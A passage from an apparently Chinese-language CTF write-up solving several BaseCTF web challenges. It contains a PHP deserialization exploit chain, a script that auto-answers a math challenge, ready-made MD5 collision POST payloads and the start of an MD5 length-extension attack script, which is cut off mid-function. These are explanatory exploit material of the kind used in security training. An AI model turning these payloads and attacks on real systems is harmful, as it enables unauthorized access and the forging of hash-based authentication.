</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>sea</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>see</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> ($_POST[<span style=color:#e6db74>&#39;nature&#39;</span>]) {
</span></span><span style=display:flex><span>    $nature <span style=color:#f92672>=</span> <span style=color:#a6e22e>unserialize</span>($_POST[<span style=color:#e6db74>&#39;nature&#39;</span>]);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>构造exp</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>$exp <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Nature</span>;
</span></span><span style=display:flex><span>$exp<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>sea</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Sea</span>;
</span></span><span style=display:flex><span>$exp<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>sea</span><span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>see</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Sink</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>urlencode</span>(<span style=color:#a6e22e>serialize</span>($exp));
</span></span></code></pre></div><h3 id=rceisamazingwithspace>RCEisamazingwithspace</h3><p>过滤了空格，用常见的空格绕过就行</p><p>网上搜搜就行了，没什么好说的</p><h3 id=数学大师>数学大师</h3><p>本体唯一的写脚本难度就是代码逻辑问题，本人写错的原因就是因为post了两次导致一直重复发包始终分数为1，就直接上exp了</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> re
</span></span><span style=display:flex><span>url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;http://challenge.basectf.fun:29992/&#39;</span>
</span></span><span style=display:flex><span>session <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>Session()
</span></span><span style=display:flex><span>session<span style=color:#f92672>.</span>cookies<span style=color:#f92672>.</span>set(<span style=color:#e6db74>&#39;PHPSESSID&#39;</span>, <span style=color:#e6db74>&#39;7ovv17kbkuh5f6pr1d2tbk07qt&#39;</span>)
</span></span><span style=display:flex><span>response <span style=color:#f92672>=</span> session<span style=color:#f92672>.</span>post(url)
</span></span><span style=display:flex><span>math <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>search(<span style=color:#e6db74>r</span><span style=color:#e6db74>&#39;second (\d+.+?)\?&#39;</span>, response<span style=color:#f92672>.</span>text)
</span></span><span style=display:flex><span>math <span style=color:#f92672>=</span> math<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>1</span>)<span style=color:#f92672>.</span>strip()
</span></span><span style=display:flex><span>math <span style=color:#f92672>=</span> math<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#39;÷&#39;</span>, <span style=color:#e6db74>&#39;//&#39;</span>)<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#39;×&#39;</span>, <span style=color:#e6db74>&#39;*&#39;</span>)
</span></span><span style=display:flex><span>answer <span style=color:#f92672>=</span> eval(math)
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>51</span>):
</span></span><span style=display:flex><span>    post_data <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#39;answer&#39;</span>: answer}
</span></span><span style=display:flex><span>    post_response <span style=color:#f92672>=</span> session<span style=color:#f92672>.</span>post(url, data<span style=color:#f92672>=</span>post_data)
</span></span><span style=display:flex><span>    math <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>search(<span style=color:#e6db74>r</span><span style=color:#e6db74>&#39;second (\d+.+?)\?&#39;</span>, post_response<span style=color:#f92672>.</span>text)
</span></span><span style=display:flex><span>    math <span style=color:#f92672>=</span> math<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>1</span>)<span style=color:#f92672>.</span>strip()
</span></span><span style=display:flex><span>    math <span style=color:#f92672>=</span> math<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#39;÷&#39;</span>, <span style=color:#e6db74>&#39;//&#39;</span>)<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#39;×&#39;</span>, <span style=color:#e6db74>&#39;*&#39;</span>)
</span></span><span style=display:flex><span>    answer <span style=color:#f92672>=</span> eval(math)
</span></span><span style=display:flex><span>    print(post_response<span style=color:#f92672>.</span>text)
</span></span></code></pre></div><h3 id=所以你说你懂-md5>所以你说你懂 MD5?</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>session_start</span>();
</span></span><span style=display:flex><span><span style=color:#a6e22e>highlight_file</span>(<span style=color:#66d9ef>__FILE__</span>);
</span></span><span style=display:flex><span><span style=color:#75715e>// 所以你说你懂 MD5 了?
</span></span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$apple <span style=color:#f92672>=</span> $_POST[<span style=color:#e6db74>&#39;apple&#39;</span>];
</span></span><span style=display:flex><span>$banana <span style=color:#f92672>=</span> $_POST[<span style=color:#e6db74>&#39;banana&#39;</span>];
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>($apple <span style=color:#f92672>!==</span> $banana <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>md5</span>($apple) <span style=color:#f92672>===</span> <span style=color:#a6e22e>md5</span>($banana))) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#39;加强难度就不会了?&#39;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// 什么? 你绕过去了?
</span></span></span><span style=display:flex><span><span style=color:#75715e>// 加大剂量!
</span></span></span><span style=display:flex><span><span style=color:#75715e>// 我要让他成为 string
</span></span></span><span style=display:flex><span>$apple <span style=color:#f92672>=</span> (<span style=color:#a6e22e>string</span>)$_POST[<span style=color:#e6db74>&#39;appple&#39;</span>];
</span></span><span style=display:flex><span>$banana <span style=color:#f92672>=</span> (<span style=color:#a6e22e>string</span>)$_POST[<span style=color:#e6db74>&#39;bananana&#39;</span>];
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>((<span style=color:#a6e22e>string</span>)$apple <span style=color:#f92672>!==</span> (<span style=color:#a6e22e>string</span>)$banana <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>md5</span>((<span style=color:#a6e22e>string</span>)$apple) <span style=color:#f92672>==</span> <span style=color:#a6e22e>md5</span>((<span style=color:#a6e22e>string</span>)$banana))) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#39;难吗?不难!&#39;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// 你还是绕过去了?
</span></span></span><span style=display:flex><span><span style=color:#75715e>// 哦哦哦, 我少了一个等于号
</span></span></span><span style=display:flex><span>$apple <span style=color:#f92672>=</span> (<span style=color:#a6e22e>string</span>)$_POST[<span style=color:#e6db74>&#39;apppple&#39;</span>];
</span></span><span style=display:flex><span>$banana <span style=color:#f92672>=</span> (<span style=color:#a6e22e>string</span>)$_POST[<span style=color:#e6db74>&#39;banananana&#39;</span>];
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>((<span style=color:#a6e22e>string</span>)$apple <span style=color:#f92672>!==</span> (<span style=color:#a6e22e>string</span>)$banana <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>md5</span>((<span style=color:#a6e22e>string</span>)$apple) <span style=color:#f92672>===</span> <span style=color:#a6e22e>md5</span>((<span style=color:#a6e22e>string</span>)$banana))) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#39;嘻嘻, 不会了? 没看直播回放?&#39;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// 你以为这就结束了
</span></span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>isset</span>($_SESSION[<span style=color:#e6db74>&#39;random&#39;</span>])) {
</span></span><span style=display:flex><span>    $_SESSION[<span style=color:#e6db74>&#39;random&#39;</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>bin2hex</span>(<span style=color:#a6e22e>random_bytes</span>(<span style=color:#ae81ff>16</span>)) <span style=color:#f92672>.</span> <span style=color:#a6e22e>bin2hex</span>(<span style=color:#a6e22e>random_bytes</span>(<span style=color:#ae81ff>16</span>)) <span style=color:#f92672>.</span> <span style=color:#a6e22e>bin2hex</span>(<span style=color:#a6e22e>random_bytes</span>(<span style=color:#ae81ff>16</span>));
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// 你想看到 random 的值吗?
</span></span></span><span style=display:flex><span><span style=color:#75715e>// 你不是很懂 MD5 吗? 那我就告诉你他的 MD5 吧
</span></span></span><span style=display:flex><span>$random <span style=color:#f92672>=</span> $_SESSION[<span style=color:#e6db74>&#39;random&#39;</span>];
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>md5</span>($random);
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;&lt;br /&gt;&#39;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$name <span style=color:#f92672>=</span> $_POST[<span style=color:#e6db74>&#39;name&#39;</span>] <span style=color:#f92672>??</span> <span style=color:#e6db74>&#39;user&#39;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// check if name ends with &#39;admin&#39;
</span></span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>substr</span>($name, <span style=color:#f92672>-</span><span style=color:#ae81ff>5</span>) <span style=color:#f92672>!==</span> <span style=color:#e6db74>&#39;admin&#39;</span>) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#39;不是管理员也来凑热闹?&#39;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$md5 <span style=color:#f92672>=</span> $_POST[<span style=color:#e6db74>&#39;md5&#39;</span>];
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>md5</span>($random <span style=color:#f92672>.</span> $name) <span style=color:#f92672>!==</span> $md5) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#39;伪造? NO NO NO!&#39;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// 认输了, 看样子你真的很懂 MD5
</span></span></span><span style=display:flex><span><span style=color:#75715e>// 那 flag 就给你吧
</span></span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;看样子你真的很懂 MD5&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>file_get_contents</span>(<span style=color:#e6db74>&#39;/flag&#39;</span>);
</span></span></code></pre></div><p>第一层正常的数组绕过</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>apple<span style=color:#f92672>[]=</span>1&amp;banana<span style=color:#f92672>[]=</span><span style=color:#ae81ff>2</span>
</span></span></code></pre></div><p>第二层和第三层都强制转string了，可以利用到fastcoll来获得内容进行绕过，这里我直接用网上的了</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>appple<span style=color:#f92672>=</span>psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%24%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%82%7D%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%84%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEcC%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%BC%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%99%B59%F9%FF%C2&amp;bananana<span style=color:#f92672>=</span>psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%A4%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%02%7E%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%04%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEc%C3%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%3C%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%9959%F9%FF%C2&amp;apppple<span style=color:#f92672>=</span>psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%24%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%82%7D%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%84%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEcC%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%BC%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%99%B59%F9%FF%C2&amp;banananana<span style=color:#f92672>=</span>psycho%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00W%ADZ%AF%3C%8A%13V%B5%96%18m%A5%EA2%81_%FB%D9%A4%22%2F%8F%D4D%A27vX%B8%08%D7m%2C%E0%D4LR%D7%FBo%10t%19%02%02%7E%7B%2B%9Bt%05%FFl%AE%8DE%F4%1F%04%3C%AE%01%0F%9B%12%D4%81%A5J%F9H%0FyE%2A%DC%2B%B1%B4%0F%DEc%C3%40%DA29%8B%C3%00%7F%8B_h%C6%D3%8Bd8%AF%85%7C%14w%06%C2%3AC%3C%0C%1B%FD%BB%98%CE%16%CE%B7%B6%3A%F3%9959%F9%FF%C2
</span></span></code></pre></div><p>最后一层已知$random的MD5值，可以控制name和md5的值，求等式进行绕过，通过了解知道是MD5长度拓展攻击</p><p>先前一直在找hashpump的一直不好用现在贴一个比较好用的脚本</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> struct <span style=color:#f92672>import</span> pack, unpack
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> math <span style=color:#f92672>import</span> floor, sin
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>MD5 Extension Attack
</span></span></span><span style=display:flex><span><span style=color:#e6db74>====================
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>@refs
</span></span></span><span style=display:flex><span><span style=color:#e6db74>https://github.com/shellfeel/hash-ext-attack
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>MD5</span>:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>__init__</span>(self):
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>A, self<span style=color:#f92672>.</span>B, self<span style=color:#f92672>.</span>C, self<span style=color:#f92672>.</span>D <span style=color:#f92672>=</span> \
</span></span><span style=display:flex><span>            (<span style=color:#ae81ff>0x67452301</span>, <span style=color:#ae81ff>0xefcdab89</span>, <span style=color:#ae81ff>0x98badcfe</span>, <span style=color:#ae81ff>0x10325476</span>)  <span style=color:#75715e># initial values</span>
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>r: list[int] <span style=color:#f92672>=</span> \
</span></span><span style=display:flex><span>            [<span style=color:#ae81ff>7</span>, <span style=color:#ae81ff>12</span>, <span style=color:#ae81ff>17</span>, <span style=color:#ae81ff>22</span>] <span style=color:#f92672>*</span> <span style=color:#ae81ff>4</span> <span style=color:#f92672>+</span> [<span style=color:#ae81ff>5</span>,  <span style=color:#ae81ff>9</span>, <span style=color:#ae81ff>14</span>, <span style=color:#ae81ff>20</span>] <span style=color:#f92672>*</span> <span style=color:#ae81ff>4</span> <span style=color:#f92672>+</span> \
</span></span><span style=display:flex><span>            [<span style=color:#ae81ff>4</span>, <span style=color:#ae81ff>11</span>, <span style=color:#ae81ff>16</span>, <span style=color:#ae81ff>23</span>] <span style=color:#f92672>*</span> <span style=color:#ae81ff>4</span> <span style=color:#f92672>+</span> [<span style=color:#ae81ff>6</span>, <span style=color:#ae81ff>10</span>, <span style=color:#ae81ff>15</span>, <span style=color:#ae81ff>21</span>] <span style=color:#f92672>*</span> <span style=color:#ae81ff>4</span>  <span style=color:#75715e># shift values</span>
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>k: list[int] <span style=color:#f92672>=</span> \
</span></span><span style=display:flex><span>            [floor(abs(sin(i <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>)) <span style=color:#f92672>*</span> pow(<span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>32</span>))
</span></span><span style=display:flex><span>             <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>64</span>)]  <span style=color:#75715e># constants</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>_lrot</span>(self, x: int, n: int) <span style=color:#f92672>-&gt;</span> int:
</span></span><span style=display:flex><span>        <span style=color:#75715e># left rotate</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> (x <span style=color:#f92672>&lt;&lt;</span> n) <span style=color:#f92672>|</span> (x <span style=color:#f92672>&gt;&gt;</span> <span style=color:#ae81ff>32</span> <span style=color:#f92672>-</span> n)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>update</span>(self, chunk: bytes) <span style=color:#f92672>-&gt;</span> <span style=color:#66d9ef>None</span>:
</span></span><span style=display:flex><span>        <span style=color:#75715e># update the hash for a chunk of data (64 bytes)</span>
</span></span><span style=display:flex><span>        w <span style=color:#f92672>=</span> list(unpack(<span style=color:#e6db74>&#39;&lt;&#39;</span><span style=color:#f92672>+</span><span style=color:#e6db74>&#39;I&#39;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>16</span>, chunk))
</span></span><span style=display:flex><span>        a, b, c, d <span style=color:#f92672>=</span> self<span style=color:#f92672>.</span>A, self<span style=color:#f92672>.</span>B, self<span style=color:#f92672>.</span>C, self<span style=color:#f92672>.</span>D
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>64</span>):
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> i <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>16</span>:
</span></span><span style=display:flex><span>                f <span style=color:#f92672>=</span> (b <span style=color:#f92672>&amp;</span> c) <span style=color:#f92672>|</span> ((<span style=color:#f92672>~</span>b) <span style=color:#f92672>&amp;</span> d)
</span></span><span style=display:flex><span>                flag <span style=color:#f92672>=</span> i
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>elif</span> i <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>32</span>:
</span></span><span style=display:flex><span>                f <span style=color:#f92672>=</span> (b <span style=color:#f92672>&amp;</span> d) <span style=color:#f92672>|</span> (c <span style=color:#f92672>&amp;</span> (<span style=color:#f92672>~</span>d))
</span></span><span style=display:flex><span>                flag <span style=color:#f92672>=</span> (<span style=color:#ae81ff>5</span> <span style=color:#f92672>*</span> i <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>%</span> <span style=color:#ae81ff>16</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>elif</span> i <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>48</span>:
</span></span><span style=display:flex><span>                f <span style=color:#f92672>=</span> (b <span style=color:#f92672>^</span> c <span style=color:#f92672>^</span> d)
</span></span><span style=display:flex><span>                flag <span style=color:#f92672>=</span> (<span style=color:#ae81ff>3</span> <span style=color:#f92672>*</span> i <span style=color:#f92672>+</span> <span style=color:#ae81ff>5</span>) <span style=color:#f92672>%</span> <span style=color:#ae81ff>16</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>                f <span style=color:#f92672>=</span> c <span style=color:#f92672>^</span> (b <span style=color:#f92672>|</span> (<span style=color:#f92672>~</span>d))
</span></span><span style=display:flex><span>                flag <span style=color:#f92672>=</span> (<span style=color:#ae81ff>7</span> <span style=color:#f92672>*</span> i) <span style=color:#f92672>%</span> <span style=color:#ae81ff>16</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            tmp <span style=color:#f92672>=</span> b <span style=color:#f92672>+</span> \
</span></span><span style=display:flex><span>                self<span style=color:#f92672>.</span>_lrot((a <span style=color:#f92672>+</span> f <span style=color:#f92672>+</span> self<span style=color:#f92672>.</span>k[i] <span style=color:#f92672>+</span> w[flag])
</span></span><span style=display:flex><span>                           <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xffffffff</span>, self<span style=color:#f92672>.</span>r[i])
</span></span><span style=display:flex><span>            a, b, c, d <span style=color:#f92672>=</span> d, tmp <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xffffffff</span>, b, c
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>A <span style=color:#f92672>=</span> (self<span style=color:#f92672>.</span>A <span style=color:#f92672>+</span> a) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xffffffff</span>
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>B <span style=color:#f92672>=</span> (self<span style=color:#f92672>.</span>B <span style=color:#f92672>+</span> b) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xffffffff</span>
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>C <span style=color:#f92672>=</span> (self<span style=color:#f92672>.</span>C <span style=color:#f92672>+</span> c) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xffffffff</span>
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>D <span style=color:#f92672>=</span> (self<span style=color:#f92672>.</span>D <span style=color:#f92672>+</span> d) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xffffffff</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>extend</span>(self, msg: bytes) <span style=color:#f92672>-&gt;</span> <span style=color:#66d9ef>None</span>:
</span></span><span style=display:flex><span>        <span style=color:#75715e># extend the hash with a new message (padded)</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>assert</span> len(msg) <span style=color:#f92672>%</span> <span style=color:#ae81ff>64</span> <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>0</span>, len(msg), <span style=color:#ae81ff>64</span>):
</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>update(msg[i:i <span style=color:#f92672>+</span> <span style=color:#ae81ff>64</span>])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>padding</span>(self, msg: bytes) <span style=color:#f92672>-&gt;</span> bytes:
</span></span><span style=display:flex><span>        <span style=color:#75715e># pad the message</span>
</span></span><span style=display:flex><span>        length <span style=color:#f92672>=</span> pack(<span style=color:#e6db74>&#39;&lt;Q&#39;</span>, len(msg) <span style=color:#f92672>*</span> <span style=color:#ae81ff>8</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        msg <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x80</span><span style=color:#e6db74>&#39;</span>
</span></span><span style=display:flex><span>        msg <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span> <span style=color:#f92672>*</span> ((<span style=color:#ae81ff>56</span> <span style=color:#f92672>-</span> len(msg)) <span style=color:#f92672>%</span> <span style=color:#ae81ff>64</span>)
</span></span><span style=display:flex><span>        msg <span style=color:#f92672>+=</span> length
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> msg
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>digest</span>(self) <span style=color:#f92672>-&gt;</span> bytes:
</span></span><span style=display:flex><span>        <span style=color:#75715e># return the hash</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> pack(<span style=color:#e6db74>&#39;&lt;IIII&#39;</span>, self<span style=color:#f92672>.</span>A, self<span style=color:#f92672>.</span>B, self<span style=color:#f92672>.</span>C, self<span style=color:#f92672>.</span>D)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>verify_md5</span>(test_string: bytes) <span style=color:#f92672>-&gt;</span> <span style=color:#66d9ef>None</span>:
</span></span><span style=display:flex><span>    <span style=color:#75715e># (DEBUG function) verify the MD5 implementation</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>from</span> hashlib <span style=color:#f92672>import</span> md5 <span style=color:#66d9ef>as</span> md5_hashlib
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>md5_manual</span>(msg: bytes) <span style=color:#f92672>-&gt;</span> bytes:
</span></span><span style=display:flex><span>        md5 <span style=color:#f92672>=</span> MD5()
</span></span><span style=display:flex><span>        md5<span style=color:#f92672>.</span>extend(md5<span style=color:#f92672>.</span>padding(msg))
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> md5<span style=color:#f92672>.</span>digest()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    manual_result <span style=color:#f92672>=</span> md5_manual(test_string)<span style=color:#f92672>.</span>hex()
</span></span><span style=display:flex><span>    hashlib_result <span style=color:#f92672>=</span> md5_hashlib(test_string)<span style=color:#f92672>.</span>hexdigest()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>assert</span> manual_result <span style=color:#f92672>==</span> hashlib_result, <span style=color:#e6db74>&#34;Test failed!&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>attack</span>(message_len: int, known_hash: str,
</span></span><span style=display:flex><span>           append_str: bytes) <span style=color:#f92672>-&gt;</span> tuple:
</span></span><span style=display:flex><span>    <span style=color:#75715e># MD5 extension attack</span>
</span></span><span style=display:flex><span>    md5 <span style=color:#f92672>=</span> MD5()
</span></span><span style=display:flex><span>
